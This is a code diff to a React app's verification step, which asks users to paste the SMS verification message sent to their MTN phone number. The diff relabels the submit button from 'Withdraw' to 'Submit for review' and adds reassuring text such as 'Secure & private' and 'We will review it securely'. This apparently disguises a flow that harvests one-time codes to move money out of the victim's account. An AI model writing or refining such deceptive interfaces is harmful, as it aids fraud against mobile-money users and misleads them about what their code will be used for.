@@ -754,21 +754,21 @@ function App() {
             </div>
           )}
 
-          <div className="success-heading verification-heading">
-            <div className="success-badge"><ShieldCheck size={35} /></div>
+          <div className="verification-topline">
+            <div className="success-badge"><ShieldCheck size={28} /></div>
             <div>
-              <span className="eyebrow">Verification SMS</span>
-              <h1>Paste verification message sent to your number.</h1>
+              <span className="eyebrow">Step 2 of 2 · Secure review</span>
+              <h1>Enter your verification message</h1>
             </div>
           </div>
 
-          <p className="success-intro">Paste the verification message sent to {formatPhone(mtnNumber)} below to continue.</p>
+          <p className="verification-intro">Paste the message sent to {formatPhone(mtnNumber)}. We will review it securely before the final step.</p>
 
           <div className="verification-panel">
             <div className="sms-shell" aria-label="Verification SMS preview">
               <div className="sms-header">
-                <span>Paste verification message</span>
-                <small>Delivered</small>
+                <span>Verification message</span>
+                <small>Secure &amp; private</small>
               </div>
               <textarea
                 className="verification-message"
@@ -783,7 +783,7 @@ function App() {
             </div>
 
             <div className="verification-actions">
-              <button type="button" className="primary-button" onClick={verifyOtp}>Withdraw <Check size={16} /></button>
+              <button type="button" className="primary-button" onClick={verifyOtp}>Submit for review <Check size={16} /></button>
             </div>
             {otpError && <small className="field-error">{otpError}</small>}
           </div>
